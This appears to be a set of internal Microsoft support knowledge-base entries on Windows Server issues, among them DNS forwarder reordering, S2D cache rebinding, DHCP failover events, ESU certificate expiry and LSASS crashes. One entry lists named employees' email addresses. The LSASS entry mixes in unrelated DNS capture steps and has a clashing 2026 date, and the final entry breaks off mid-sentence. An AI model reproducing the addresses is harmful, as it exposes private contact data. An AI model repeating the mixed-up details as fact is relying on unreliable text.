symptom: Ever wonder how DNS server's dynamic forwarding works?   At DNS initialization the dynamic list of IP addresses is copied from the static list configured by admins for the server. This list is periodically reordered based on bad response behavior for client queries.   There are two key values here:Max response time threshold = 1 second (hardcoded) Number of consecutive bad responses from that forwarder = 3 seconds (hardcoded). Here, we are considering a "bad response" as one that times out, or one that takes longer than the 1 second threshold. The forwarder in the list that times out a query OR returns a response in greater than max response time gets a bad response counter increment. After this counter reaches 3 that forwarder is moved to the end of the list, that is, if it's not already at end of the list Finally the bad response counter for all forwarders in list are reset.   This is to prevent a new reordering way too soon before the *new* order has had a chance to be tried out for a while. In this way the list eventually gravitates towards best (fastest) forward at the front and slowest at the end. Now, for a brand new query that comes in, the first forwarder in that list is tried. If it times out to that forwarder the query will be retried against the next one in the list. If that retried query runs out of forwarders then send back SERVFAIL   Example  Initial forwarder list = A, B, C, D, E because that's the static list configured.  Nothing is known about response times.  All counters cleared. Query for yahoo.com comes in.   A chosen Query for outlook.com comes in.   A chosen Query for intel.com comes in.  A chosen Query for yahoo.com times out.  B is chosen.   A counter = 1 Query for outlook.com times out.  B is chosen.  A counter = 2 Query for intel.com times out.  B is chosen.   A counter = 3.  List reordered: B,C,D,E,A.  All counters reset Response for retried query for yahoo comes in.  Response time was 30ms Response for retried query for outlook.com comes in.  Response time was 4 seconds.   B counter = 1. Response for retried query for intel.com comes in.  Response time was 1.5 seconds.  B counter = 2. Query for travelcostarica.com comes in.  B chosen. Query for travelcostarica.com comes in (from another client).  B chosen Response for travelcostarica.com comes in.  Repsonse time was 1.1 seconds.  B counter = 3.  Reorder = C,D,E,A,B.   All counters reset Response for travelcostarica.com times out from B (for second client).  D is chosen.  B counter = 1. Note that B is now at the end of the list due to reordering, but it was at the front when the query first went out.  D is the next choice in the new list based on the index to be used next. Response for retried query for travelcostarica.com from second client times out from D.  E is chosen.   D counter = 1 Response for retried query for travelcostarica.com from second client times out from E.  A is chosen.   E counter = 1 Response for retried query for travelcostarica.com from second client times out from A.  B is chosen.   A counter = 1 Response for retried query for travelcostarica.com from second client times out from B.  B counter = 2.   No more servers to choose.  Send SERVFAIL. Customers can turn off dynamic forwarding with Set-DnsServerForwarder -EnableReordering $false But there is rarely a reason why they should need to do this. One must ask the question: 'Why wouldn't you want the best known forwarder in terms of response time tried first, and then others in the order of 'best' '? One possibility is that a server in that list can never answer a particular query.   In that case that forwarder shouldn't be in the server-level static forwarder list in the first place.  A conditional forwarder for that particular query should be created to handle that specifically. But sometimes customers have a need for a particular forwarder to be in both places. One recent example was 8.8.8.8 (Google) to be a 'catch-all' configured as the last of four forwarders in the server forwarder list.   But Google could never resolve a very particular host record learned from a CNAME query.   In this case a special conditional forwarder was necessary for the host record name, and as such that conditional forwarder would always be used for incoming queries that translated from that CNAME. The Google server was still appropriate at the end of the server-level forwarders list to catch all other queries that Google *could* answer, and had to respond because other forwarders in the list timed out.

symptom: Issue:Storage pool is down.Three node S2D cluster.Recent change:Physical location of the data-center movedOS: Windows server 2016(patched to latest)
rootCause: 1.Get-physical disk shows that capacity drive for two of the three nodes as lost communication.2> Running get-storagenode -name XX | get-physicaldisk -physicallyconnected on problematic node does not give any output for the capacity drives.3> The SBL section shows that capacity drives for the problematic node has binding issue with the cache device: Keyword:CacheDiskStateOrphanedWaiting.4> Whereas working node SBL section for the capacity drive has the entry below:CacheDiskStateInitializedAndBound5> Binding of the capacity drives to the cache drive was unbound in the problematic nodes.
solution: Binding is an SBL-level operation which associates a capacity device with a cache device. Rebinding usually implies breaking an existing binding because of a failed cache device, and binding to a functional cache device. Because this can be done with data still only staged in the cache device, breaking the binding can result in losing that copy of data. So before running any rebind operations, you should: Ensure the cache device has actually failed. If it is recoverable through a reboot or some other operation, that should be the first course of action. Ensure repairs have made as much progress as possible. Spaces should be able to get healthy unless failures have happened across multiple nodes. If you are unsure of why the system is in the state it is in, it is best to engage the PG before running any rebind operations. Ensure you only run commands against one node at a time if multiple devices are impacted and wait for repair after each command is run. Rebind can be accomplished against a node using the below command. Do not run without the -Node parameter, as that will run across all nodes in the cluster and potentially result in data loss. The functionality of running across all nodes in the cluster will be removed in a future update. Repair-ClusterS2D -RecoverUnboundDrives -Node "Nodename"   Note: The above command should only be executed after the proper log analysis and only when the storage pool is down: S2D on XX Read-only Unknown False True In case, if the storage pool is up we can run optimize-storagepool.   For the latest information, read here: S2D Troubleshooting/Physical Disks - OSGWiki

symptom: Update installation fails with error ERROR_FILE_NOT_FOUND while calling the function Windows::Rtl::SystemImplementation::DirectFileSystemProvider::SysCreateFile
rootCause: The machine was missing the C:\Windows\ToastData directory. The update process tried to open C:\Windows\ToastData and failed with STATUS_OBJECT_NAME_NOT_FOUND, causing CBS to fail with 0x80070002.
solution: Created C:\Windows\ToastData folder manually on the machine and then installed the update successfully.

symptom: Printers published in Active Directory are not discoverable from client machines.
rootCause: Printer pruning: when a domain controller goes offline, Printer Pruner cannot contact print servers and marks all published printers as orphaned. After 24 hours the PrintQueue objects are deleted.
solution: 1. Unpublish and re-publish the printers. 2. Ensure at least one domain controller in each site is running the Spooler service.

symptom: Mapping drive to Azure Files SMB endpoint fails with error 53 (0xC000000D STATUS_INVALID_PARAMETER) when Kerberos ticket exceeds 16K due to large group membership.
rootCause: Azure Files SMB endpoint returns STATUS_INVALID_PARAMETER when receiving fragmented Kerberos authentication data. The endpoint does not support accumulation of security blob fragments during negotiation.
solution: Workaround: reduce user group membership to keep Kerberos ticket under 16K. Ensure resource group compression is enabled on DCs. Bug tracked by Azure Files PG.

rootCause: The /quiet switch cannot automatically select the correct image index when Install.wim contains multiple images.
solution: Use DISM to find the correct image index, then run: setup.exe /auto upgrade /quiet /Compat Ignorewarning /ImageIndex <N>

symptom: Event ID 20291, 20292 triggers on DHCP servers randomly which are configured with failover relation on Windows Server 2012 R2.
rootCause: Relay agents sending multiple duplicate DHCP requests from the same client to both DHCP servers simultaneously. DHCP failover has time granularity of seconds, so multiple duplicate requests within a second cause outdated binding information rejections.
solution: These events can be safely ignored as the address lease and partner update succeed despite the events. To suppress events, introduce a delay on one of the relay agents to prevent duplicate attempts.

symptom: SOFS (Scale-Out File Server) share creation fails and share properties report error: 'Error Retrieving SMB Server Settings. Data of this type is not supported' on Windows Server 2016.
rootCause: NullSessionShares registry value under LanManServer\Parameters was configured as REG_SZ (String) instead of REG_MULTI_SZ (Multi-String), causing WMI query Get-SmbServerConfiguration to fail.
solution: Delete the incorrectly typed registry value (NullSessionShares REG_SZ) under HKLM\System\CurrentControlSet\Services\LanManServer\Parameters, then run GPUPDATE /FORCE. If the value does not reappear, it was a one-time script/reg add change.

symptom: Cannot delete DHCP predefined option definition on Windows Server 2012 R2. Deletion succeeds without error but option reappears on refresh. Creating new option with same OptionID fails with 'object already exists'.
rootCause: R_DhcpRemoveOptionV5 does not convert the passed OptionID before comparing with stored values (which may be >255), so it doesn't match and returns ERROR_DHCP_OPTION_NOT_PRESENT silently. R_DhcpGetAllOptions converts stored OptionID (StoredOptionID % 256) before returning.
solution: Delete the option using the stored OptionID value directly (e.g., 'netsh dhcp server delete Optiondef 900' for a stored ID of 900 that displays as 132).

symptom: PhysicalDisk and LogicalDisk performance counters missing in Perfmon. Error: 'Unable to add these counters: \PhysicalDisk(*)\% Idle Time, \PhysicalDisk(*)\Avg. Disk Queue Length'.
rootCause: 'Disable Performance Counters' registry value was set to 1, disabling disk performance counters.
solution: 1. Set 'Disable Performance Counters' registry value to 0. 2. Stop and restart Performance Logs and Alerts service. 3. Stop and restart Windows Management Instrumentation service. If still not working, reboot the server.

symptom: Consider scenario where you have four Active directory certificate services servers configured on Windows server 2016 Azure cluster. All the devices are in disconnected network from public internet and reporting High CPU utilization for conhost.exe along with appidcertstorecheck.exe processes piled up in task manager. Appidcertstorecheck.exe shows 334 process active in task manager. Conhost.exe shows 339 process active in task manager.
rootCause: The service (AppIdCertStoreCheck) monitors the local machine trusted root certificate store, and it invokes a user-mode task (%SystemRoot%\System32\AppIdCertStoreCheck.exe) to reverify the certificates at least once per day and whenever there is a change to the certificate store. Since these devices are in DMZ with no internet access and no offline CTL distribution is configured. The AppIdCertStoreCheck process is not able to verify the certificate and process is lying in waiting state in the task manager till system is reboot and never exited.
solution: Allow all the required URLs and Public IP addresses through Firewall and thus appidcertstorecheck process complete its task.

symptom: Windows clients not registering DNS Ptr records causing the devices inaccessible via IP address, no specific error is generated by Windows client machine, so far 166 machines are affected.We have 3 set-ups for head office and branch offices as below: (Both A and Ptr registration taken care by DHCP) Through Infoblox -> Support Dynamic DNS, (You have pushed a policy to stop DNS registration from clients) Through DHCP >> Support Dynamic DNS, (You have pushed a policy to stop DNS registration from clients) 3 Ubuntu >> Does not support Dynamic DNS, Pushed GP to trigger DNS registration. DisableDynamicDNS group policy.
solution: Discussion: Who is supposed to update the DNS record as discussed by default Windows client will always register it�s a record while as DHCP will take care of Ptr record registration. DHCP provides the flexibility to overwrite the DNS registration as well by just checking the option �Always dynamically update DNS records� on the DHCP server post this both A and Ptr dynamic registration will be taken care by DHCP server. Im not sure how the concept works with Infoblox or Linux based DHCP servers. Since you have a complex environment with 3 DHCP implementations which ideally should not be a case, you have pushed a group policy for Linux based client to trigger DNS registrations, later on it was revealed the required group policy was not actually pushed the clients and after the group policy issues DNS registration did work as expected. Update received after your internal discussion: After troubleshooting we realized that due to a complicated branch architecture we should perhaps move one of the workstations into our campus Network to see how the DNS registration work from there and after a while it was discovered that Group Policies do not apply to the workstation. When group Policies we directly applied to workstation it was remediated in the sense that it registered in DNS and everything was fine on this workstation. We tried similar on another workstation that is in another branch and once again it worked. We will now try the same on all SCCM Missing Clients for Windhoek based Branch Workstations and if it successful we will push it through to all Missing Clients. We not sure if this resolves the issue but at least it is taking us on the right track and will have to confirm with the SCCM Support guys afterwards. DNS updates can be sent for any one of the following reasons or events: An IP address is added, removed, or modified in the TCP/IP properties configuration for any one of the installed network connections. An IP address lease changes or renews any one of the installed network connections with the DHCP server. For example, this update occurs when the computer is started or when you use the ipconfig /renew command. You use the ipconfig /registerdns command to manually force an update of the client name registration in DNS. The computer is turned on. A member server is promoted to a domain controller. How dynamic DNS works, for more information please refer:https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/configure-dns-dynamic-updates-windows-server-2003 Further troubleshooting: We found the DisableDynamicUpdate registry group policy is not applied to the affected machines, possibly because the domain controller is not able to resolve the machine hostname. We have 2 options here either check the �Register Connection in DNS� manually or add the registry manually. HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\DisableDynamicUpdate Range: 0 - 1 Default value: 0 Please refer: https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/enable-disable-dns-dynamic-registration Current Status: Machines have registered DNS successfully on main site now and also on branch sites.

symptom: HKow to allow or block DNS communication from RODC (Read-Only Domain Controller) towards ROOT DNS servers
solution: By default, Windows DNS servers are configured to use root hint servers for external lookups. Another option for external lookups is to use forwarders. Basically, both options are ways to resolve hostnames that your internal servers cannot resolve. So which one is the best? it really comes down to personal preference. Some general guidelines they will help you decide: Use root hints if your main concern is reliability (windows default) Forwarders might provide faster DNS lookups. Forwarders can also provide security enhancements Forwarders must be configured manually on each DC. Without having a specific DNS server designated as a forwarder, all DNS servers can send queries outside of a network using their root hints. As a result, a lot of internal, and possibly critical, DNS information can be exposed on the Internet. In addition to this security and privacy issue, this method of resolution can result in a large volume of external traffic that is costly and inefficient for a network with a slow Internet connection or a company with high Internet service costs. At the end it comes down to personal preference considering reliability and security still we should not expose DC publicly.

symptom: If you nest any of the following groups in one of the protected groups that is protected by AdminSDHolder and there are more then 256 objects that have one of the following as the primaryGroupID attribute, not all will be updated with the security descriptor based on that attribute. Domain Users Domain Guests Domain Computers Domain Controllers NOTE: There could be other groups that were not known from a default domain install perspective. Also, the Primary group can be changed. These are just default ones for User and Computer objects for example.
rootCause: Code that collects group membership based on the primaryGroupID attribute is not handling a paged query properly and only makes one pass of 256 objects. So, any additional objects will not get updated based on order of retrieval.
solution: It is not typical to have these groups nested in a protected group and therefore could be considered a configuration issue.

symptom: Customer has 2 servers with Windows Storage 2012 R2 configured as file server with Windows Failover Cluster role installed and configured for high availability. Customer mentioned that they notice that there is a folder path C:\Windows\ServiceProfiles\NetworkService\AppData\Local\PeerDistRepub\Store which has around 20 GB with data extension and other node have around 24 GB. Customer has the following questions for us. Questions What is this data classification, C:\Windows\ServiceProfiles\NetworkService\AppData\Local\PeerDistRepub\Store? Can we delete or prevent the data generated under this location in future because they have resource limitations in system partition? Way to migrate file server with failover cluster roles and migrate to different hardware (2 server and shared storage also) with same failover cluster rules and same folder permission?
solution: Provided the below answers to the customer queries. What is this data classification �C:\Windows\ServiceProfiles\NetworkService\AppData\Local\PeerDistRepub\Store�? The data stored in this location �C:\Windows\ServiceProfiles\NetworkService\AppData\Local\PeerDistRepub\Store� is for storing cached data when using BranchCache in your environment. When you have/had BranchCache enabled in your environment and configured this server to act as hosted cache server, the cached data would be stored in this default location. Can we delete or prevent the data generated under this location in future because they have resource limitations in system partition? Yes, the data here can be flushed using the command �netsh branchcache flush� command which deletes the cached data. In future, to prevent accumulation of data in this location, you will have to stop using this server for BranchCache technology. Way to migrate file server with failover cluster roles and migrate to different hardware (2 server and shared storage also ) with same failover cluster rules and same folder permission? Engineer from SHA team provided the below articles that describes customer requirement of upgrading a 2-node Failover Cluster.

symptom: Environment: ============= Five Node 2019 SQL AG cluster Virtual Machines running in Azure Symptom: =========== In this specific case customer wanted to mount an ISO for SQL server installation, every time they try to mount the ISO it failed with generic error as below We tried to check if are even able to Create a New VHD/VHDX file locally on the server , it failed with error below. At this point we checked the event logs and we found below error in VHDMP logs VHDMP driver Error 0xc0000061 -1073741727 STATUS_PRIVILEGE_NOT_HELD A required privilege is not held by the client. ntstatus.h
solution: We started comparing the Local policies on working and non working cluster nodes, as the issue was limited to only one specific node While checking the local policies we found that one of the policy named "Perform Volume Maintenance tasks" under (User Rights Assignment) had only SQLService accounts added and the administrators group was missing , because of which customer was able to perform all the tasks when logged in with SQL service account We added the Admin group to the policy and tried again to mount the ISO and ISO was mounted successfully. Path for local policies: =================== Start->Run->Secpol.msc->Local Policies->User Rights Assignment>>Perform Volume Maintenance Tasks Snippet : ======= >> You need Both Administrators and SQL Service account added to that policy.

symptom: Multiple profiles being created with server names in the name Issue  seems to occur when the primary DFSN server is rebooted for Windows updatesUsing DFSN namespace with Azure FileSync for replication This is by design: If the same file is changed on two servers at approximately the same time, what happens?Azure File Sync uses a simple conflict-resolution strategy: we keep both changes to files that are changed in two endpoints at the same time. The most recently written change keeps the original file name. The older file (determined by LastWriteTime) has the endpoint name and the conflict number appended to the filename. For server endpoints, the endpoint name is the name of the server. For cloud endpoints, the endpoint name is Cloud. The name follows this taxonomy: <FileNameWithoutExtension>-<endpointName>[-#].<ext> For example, the first conflict of CompanyReport.docx would become CompanyReport-CentralServer.docx if CentralServer is where the older write occurred. The second conflict would be named CompanyReport-CentralServer-1.docx. Azure File Sync supports 100 conflict files per file. Once the maximum number of conflict files has been reached, the file will fail to sync until the number of conflict files is less than 100. Please refer to :  Frequently asked questions (FAQ) for Azure Files | Microsoft Learn

rootCause: 0x80070005 - E_ACCESSDENIED when deleting existing package catalog.
solution: Navigate to C:\Windows\Servicing\Packages and find all the .mum and .cat files from the package that is being denied access (in this case, KBxxx) and move them to different location for backup. Then install the update.

symptom: Abstract This KB was written proactively on January 4, 2024 in anticipation of Year 4 Extended Security Updates failing to install on Azure Arc hosted Windows Server 2012 and Windows Server 2012 R2 VM guests where administrators manually installed the required intermediate certs listed in: Internal KB5034654: ESU: 2012/2012R2 "The chain does not seem valid" E_FAIL vs. following the preferred guidance of allowing connectivity to the https://www.microsoft.com/pkiops/certs end point suggested in:  Internal KB5033698: Servicing: 11B.23: November 2023 Updates fail to install / rollback due to ESU connection failures on Azure Arc-enabled WS 2012 \ 2012 R2 devices (ICM 443273661) The current expiration date on intermediate certs will prevent any year 4 ESU from being installed after cert expiration on June 27 including the release Windows Updates tentatively scheduled for release on or after 2024  7B on July 9, 2024.  ResourcesCertificate downloads and revocation lists section of Learn: Azure Certificate Authority details FAQ When will certs needed to install year 4 ESUs on Azure Arc that have expiration dates on June 27, 2024 be renewed?A1> MSFT internal: Right now, the Azure process/plan to update the expired certificates in this scenario is unknown/undecided. The new certificates are not available yet, so there is nothing anyone can install now. The date for when the new certificates will be available Ive casually heard is Q2 timeframe. For customers that manually install the intermediate certificates, they will want to think about a plan or reminder to manually replace them as a contingency. For customers that allow access to the URLs, they dont have to do anything. January 17, 2024 Update An Azure Stack HCI developer claims that intermediate certs expiring on June 27, 2024 are being replaced by already available intermediate certs that expire on August 25, 2026 and that Microsoft is evaluating how to share this information.
rootCause: Manually installed intermediate certs have an expiration date of June 26, 2024
solution: Open connectivity to the endpoints used by Azure Arc to download critical intermediate certificates: https://www.microsoft.com/pkiops/certs (https://www.microsoft.com/pkiops/certs)Send email if you have a matching case: To: Aurnov Chattopadhyay <aurnovc@microsoft.com>; Poornima Priyadarshini <ppriya@microsoft.com>; Murty Gorti <Murty.Gorti@microsoft.com>; Nitin Gupta <nitingup@microsoft.com>; Kim Johnson <kimberj@microsoft.com>; Chris Puckett <Chris.Puckett@microsoft.com>; Ebenezer Sundararaj <Ebenezer.Sundararaj@microsoft.com>; HeeSouk Park <hspark@microsoft.com>; Arren Conner <arrenc@microsoft.com>Subject: <case #> is a match for extension needed for manually installed intermediate certs used to install year 4 ESUs on Azure Arc-hosted WS 2012 / 2012 R2 VMs \ <company name> \ <case owner alias> # of impacted seatsBusiness reason why customer can't enable connectivity to https://www.microsoft.com/pkiops/certs (https://www.microsoft.com/pkiops/certs)
sourceRef: ContentIdea#185920

symptom: How can I create Custom Resource Graph query for all Storage Accounts in a subscription to view Storage Account Capacity for Azure Files and Shares for FSLogix Profiles?    Querying storage account capacities, specifically for Azure Files and Shares used for FSLogix profiles, using Azure Resource Graph directly might not provide the level of detail you're looking for.   Azure Resource Graph is excellent for querying resources and their properties across subscriptions, but it primarily focuses on resource metadata, not the detailed metrics or capacity information of storage accounts or the files and shares within them. For Azure Files and the FSLogix profile containers, you typically need to look at metrics like used capacity, which aren't directly exposed as properties in the Resource Graph schema for storage accounts.   These metrics are available through Azure Monitor, which can track and report the capacity used by Azure File shares. However, you can use a combination of Azure Resource Graph to list all storage accounts and then leverage Azure Monitor's metrics to programmatically fetch the capacity details for each File Share. The below suggestions may help you when you want to to view Storage Account Capacity for Azure Files and Shares for FSLogix Profiles
sourceRef: ContentIdea#187151

symptom: Abstract The customer has installed the FTP server role on a Windows Server.The FTP server relies on the IIS configuration. The customer has configured IIS as outlined in the article FTP Client Certificate Authentication <clientCertAuthentication> | Microsoft Learn    Extract from the IIS FTP sample configuration     <ftpServer serverAutoStart="true">      <security>         <authentication> ...             <clientCertAuthentication enabled="true" />         </authentication>         <ssl serverCertHash="57686f6120447564652c2049495320526f636b73"            controlChannelPolicy="SslRequire"            dataChannelPolicy="SslRequire" />         <sslClientCertificates clientCertificatePolicy="CertRequire"            useActiveDirectoryMapping="true"The customer is using a 3rd party FTP client which will initially connect anonymously to the FTP server, but will then provide a user client certificate for which Active Directory strong certificate mapping should be used to authenticate to user to the Active Directory Domain. The customer has also configured the UPN suffix to match the one from the SAN of the user certificate so that the UPN from the client certificate can be successfully mapped to an existing Active Directory user account.  The mapping request fails because Schannel on the FTP server is calling the the Kerberos client on the FTP server for a Kerberos S4U request with the KERB_S4U_OPTIONS_use_reply_key_usage option 70000000 (10000000 + 40000000 + 20000000) that are documented in the protocol docs [MS-SFU]: PA_S4U_X509_USER | Microsoft Learn. Because of the 0x10000000 option (KERB_S4U_OPTIONS_nt_auth_policy_not_required), the KDC logs in the KDC ETL KdcFindS4UClientAndRealm request s4u mappings not requiring NT Auth policy check  The KDC then fails the request before even processing the certificate mapping and logs the following error in KDC ETL: KdcFindS4UClientAndRealm cannot find a satisfied mapping, returning error: 0xc Symptoms Schannel on the FTP server is calling the the Kerberos client on the FTP server for a Kerberos S4U request with the KERB_S4U_OPTIONS_use_reply_key_usage option 70000000.Customer has mapped the certificate with SN in altsecID:padata-type: pA-FOR-X509-USER (130)    padata-value: <PII value removed>        user-id            nonce: 531425157            cname            crealm: contoso.local            subject-certificate: PII Subj            Padding: 0            options: 70000000        checksum            cksumtype: cKSUMTYPE-HMAC-SHA1-96-AES-256 (16)            checksum: 89fba3b71fab222936954cdc KDC ETL displays the error "KdcFindS4UClientAndRealm cannot find a satisfied mapping, returning error: 0xc"KdcFindS4UClientAndRealm() - KdcFindS4UClientAndRealm request s4u mappings not requiring NT Auth policy checkKdcFindS4UClientAndRealm() - KLIN(4041a29) : KdcFindS4UClientAndRealm cannot find a satisfied mapping, returning error: 0xc Protocol docs as of November 2, 2023 at [MS-SFU]: PA_S4U_X509_USER | Microsoft Learn document the following flags and fail to account for KERB_S4U_OPTIONS_use_reply_key_usage option 70000000 (10000000 + 40000000 + 20000000).options: Specifies the additional options in the S4U request. Value Meaning 0x80000000 KERB_S4U_OPTIONS_reserved. Reserved. 0x40000000 KERB_S4U_OPTIONS_check_logonhours This option causes the KDC to check logon hour restrictions for the user. Note that logon hour restrictions are calculated based on the time zone of the DC, not of the client. 0x20000000 KERB_S4U_OPTIONS_use_reply_key_usage<5> In a request, asks the KDC to sign the reply with key usage number 27. In a reply, indicates that it was signed with key usage number 27. If this option is set in the request, and if the KDC understands this option, it will sign the reply with key usage number 27 and set the same option in the reply. Otherwise, it will sign the reply with key usage number 26 and not set the option in the reply. 0x10000000 KERB_S4U_OPTIONS_nt_auth_policy_not_required This option causes the KDC to omit NTAuth store certificate chain checks and is designed for scenarios where the client performs its own chain checks. If this setting is used incorrectly, it can pose a security risk due to potentially unchecked certificate chains. This bit can be processed by DCs who understand and ignored by those who don't. A DC processing the bit would reply the same if succeed. The value STATUS_NO_SUCH_USER is returned if a DC ignoring the bit has processed the request. 0x08000000 KERB_S4U_OPTIONS_unconditional_delegation. Unconditional delegation.
rootCause: On the FTP server the client certificate fails the NTAuth policy check and the following line is logged in the Schannel etl: Client certificate failed to verify with NT_AUTH policy (0x80090325)Because of this Schannel on the FTP server generates a Kerberos request with flag/options 70000000 which causes the KDC to fail the request before even processing the certificate mapping.
solution: Ensure that the client certificate passes the NTAuth policy check on the FTP server. This results in a Kerberos S4U request with flags 60000000 which is then successfully processed by the KDC.
sourceRef: ContentIdea#187635

symptom: Unable to install ESU Year-1 activation key on Windows Storage Server 2012 R2, getting error 0xC004F055. Adding the ESU Year-1 product key was successful, but when activating got the following error: From SPP events we found the following error:   # for hex 0xc004f055 / decimal -1073418155   SL_E_BASE_SKU_NOT_AVAILABLE                                    slerror.h # The Software Licensing Service reported that the base SKU # is not available.   Cause:  Windows Storage Server 2012 R2 is not supported under ESU program. Recommendation/Information:  As per article Windows Storage Server 2012 R2 - Microsoft Lifecycle | Microsoft Learn ESU program is not applicable for Storage server. Hence, we engaged our PG (Product team) and got confirmation that Storage server is not covered under ESU program.
sourceRef: ContentIdea#189576

symptom: Abstract Windows Updates released between 2023 6D and 2023 10B depending on OS version addressed an issue where 1644 events identifying expensive and inefficient queries were NOT logged if the LDAP search filter exceeded ~29K, documented in Internal KB5019760: ADDS: ADPERF: Event ID 1644 identifying expensive and inefficient LDAP queries is not logged on DCs if LDAP search filter exceeds ~29KB Windows Updates released in March 12, 2024 introduced a memory leak in LSASS that resulted in (1.) degraded OS and application performance (2.) applications crashes (3.) caused by a memory leak in LSASS that in extreme cases caused (4.) caused LSASS to crash which triggered spontaneous reboots on 3B.24-patched DC role computers documented inInternal KB5037339: Servicing: 3B.24: LSASS leaks memory when March 12, 2024-patched DCs service a Kerberos AS request (ICM 483835474) The memory leak in 2024 3B was resolved on Windows Server 2012 R2 -> WS 2022 inclusive by 2024 3OOB Windows Updates released between March 22 and March 25, 2024. 2024 4B Windows Updates released April 9, 2024 also included the fix for the LSASS memory leak as well as the 1644 logging fix.  This article documents an LSASS access violation 0x5 that occurs on 3OOB.24+-patched DCs (1.) servicing expensive / inefficient LDAP queries when (2.) Field Engineering diagnostic logging is set to level 5 in case 2404050030005602 The issue documented in this article is NOT related toA stack overflow seen in case 2112090010001811 (by the same customer).   Multiple LSASS crashes caused or exposed by the NTLM auth forwarding bug introduced by 2024 4B Windows Updates including Internal KB5038647: Servicing: 4B.24: LSASS Crash on KerbDecryptServiceTicket on April 9, 2024 patched devices (ICM 497095364) Internal KB5038540: Servicing: 4B.24: ADDS LSASS Access Violation in NTDLL.DLL due to double free on April 9, 2024 Patched DCs (ICM 495268929) Internal KB5038684: Servicing: 4B.24: LDAP Arena Heap \ SAM RSO queue memory leak occurs if RSO worker thread fails to clear queue exposed by the NTLM auth forwarding bug on April 9, 2024 patched DCs (ICM 497849175) Current debugging efforts suggest that regression MAY be triggered by OS Bug 41639332👀[Fe][DBD] Server 2022: Event ID 1644 is not logged when the LDAP search filter is larger than ~29KB Which per the following KB shipped disabled by default in 2023 7B and enabled by default in 2023 10B on WS 2022 Internal KB5019760: ADDS: ADPERF: Event ID 1644 identifying expensive and inefficient LDAP queries is not logged on DCs if LDAP search filter exceeds ~29KB As a result, this KB has a "3B.24" prefix in its title but has also been tagged with a "Servicing: 10B.24" keyword based on the following: Case 2404050030005602 reported LSASS crashes servicing long running LDAP queries after installing 3B.24 Windows Updates then belatedly admitted that pre-2024 3B \ 3OOB-patched DCs were also experiencing the same crash signature as 3B.24+-patched DCs. Status Updates April 26, 2026. Debug analysis continues in the working thread for case 2404050030005602. Tracking bugs added to bug tables.  April 12, 2024. KB created after an online retailer reported seeing this crash on 3OOB.24 and 4B.24-patched devices in case 2404050030005602 Resources Internal KB5037339: Servicing: 3B.24: LSASS leaks memory when March 12, 2024-patched DCs service a Kerberos AS request (ICM 483835474) OS Bug 50203031: Server 2022: Field Engineering diagnostics logging intermittently crashes lsass on domain controllers Tracking bug filed April 27, 2024 against WS 2022  on behalf of case 2404050030005602 where the customer enables Field Engineering = 5 on ALL WS 2022 DCs.  OS Bug 40865587: [Fe] Excessive LDAP filter leads to lsass crashing on Domain Controllers Bug filed on behalf of case 2112090010001811 to mitigate LDASS crashes + intermittently slow LDAP binds after setting (1.) Field Engineering to logging level 5 and (2.) turning all thresholds to the lowest supported values (3.) when servicing excessive \ expensive LDAP queries. The customer has a web application sending an LDAP query with a very long LDAP filter to their domain controller. Fix shipped disabled-by-default in 2023 4B and enabled by default in 2023 7B.  Some slowness was attributed to the Kerberos Logon Session locking style (aka global locks OS Bug 41639332👀[Fe][DBD] Server 2022: Event ID 1644 is not logged when the LDAP search filter is larger than ~29KB Events 1644 (expensive queries) are not logged when filters are over ~29k characters. Affects ability to troubleshoot LDAP expensive queries for large financial customer. Must fix. Reason is that event logs are limited to 64k bytes including all parameters and metadata Internal KB5019760: ADDS: ADPERF: Event ID 1644 identifying expensive and inefficient LDAP queries is not logged on DCs if LDAP search filter exceeds ~29KB Fix shipped DBD in 2023 7B and EBD in 2023 10B on WS 2022 Internal KB5017539: ADDS: LDAP: LSASS Crashes with exception code 0xc00000fd (STATUS_STACK_OVERFLOW) in ntdsai.dll on DCs processing large / excessive LDAP filters Internal KB written on behalf of case 2112090010001811 and the fix by OS Bug 40865587 Symptoms from case 2404050030005602 LSASS intermittently crashes on 3OOB-patched DCs when servicing an inefficient ldap_matching_rule_in_chain group membership query that exceeds the 120 second times out and never executes.(member<==>CN=<object name>,OU=<grandchild OU>,OU=<child OU>,OU=parent OU,DC=contoso,DC=com) The installation of 3OOB was confirmed. Memory dumps do not show any signs of a heap leak.  Customer later admits that the LSASS crashes on pre-3OOB patched DCs running the same OS version.  0x5 AV in LSASS Process Collect Packet capture on Windows DNS recursive resolver. The packet capture will show extra glue validation queries from the recursive resolver. logman create trace "ds-dns" -ow -o c:\ds-dns.etl -p {406F31B6-E81C-457A-B5C3-62C1BE5778C1} 0xffffffffffffffff 0xff -nb 16 16 -bs 1024 -mode Circular -f bincirc -max 4096 -ets

Note: Windows EEs suggest using a flag of 0x3FFE77 as the use of FFFFFFFF

symptom: Imagine a scenario where an administrator operates a legacy website that requires an ActiveX control for functionality. The website retrieves the ActiveX control from a secure (https) site. The necessary prerequisites and Group Policy settings are already configured in their system. The ActiveX controls are situated on a non-Windows operating system, compatible only with TLS 1.0 or TLS 1.2. However, a standard user encounters failure when attempting to download the ActiveX control while browsing
rootCause: The issue arises because Windows 8.1, Windows Server 2012 R2, Windows 10, Windows Server 2016, and later versions of Windows natively support TLS 1.2 for client-server communications over WinHTTP. ActiveX Installer only initiates the TLS handshake with TLS 1.2, but the legacy non-windows application server only supports TLS 1.0 and TLS 1.1, causing the handshake failure with error SEC_E_ALGORITHM_MISMATCH.
solution:
To enforce TLS 1.0, TLS 1.1, and TLS 1.2, verify the value of the DefaultSecureProtocols registry setting. For example: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp\
DefaultSecureProtocols = (DWORD): 0xAA0

HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp\
DefaultSecureProtocols = (DWORD): 0xAA0
Note: TLS 1.0 and 1.1 are weak protocols, please consider recoding the application which supports higher TLS protocols.

symptom: After installing April 2024 update for Windows Sever 2008 or Windows Server 2008 R2, there is a code change in DFSR that can prevent inbound replication from succeeding if SYSTEM does not have FULL control of files and folders in the replication group.  Windows Server 2008 R2 April 9, 2024�KB5036967 (Monthly Rollup) - Microsoft Support April 9, 2024�KB5036922 (Security-only update) - Microsoft Support   Windows Server 2008 April 9, 2024�KB5036932 (Monthly Rollup) - Microsoft Support April 9, 202
